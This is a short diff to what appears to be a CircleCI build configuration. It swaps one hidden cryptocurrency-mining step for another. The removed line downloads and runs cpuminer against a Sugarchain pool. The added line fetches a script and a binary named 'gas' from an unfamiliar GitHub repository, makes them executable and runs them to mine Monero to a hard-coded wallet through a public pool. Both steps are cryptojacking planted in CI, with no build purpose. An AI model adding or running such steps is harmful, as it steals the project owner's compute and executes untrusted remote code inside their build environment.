@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qgmqv5k9m44h4rf2qk3l3dm62j58sp4t76j6j5u.asd
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 86MX8aRxReUgAJaRmudwimF7QKPHRGstu93UwfuBUagLWovopncLrAd31EYYtvCbrFehTtwaiwLyu9PpkbJwBXcj8LK7g3C  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -de.monero.herominers.com:1111
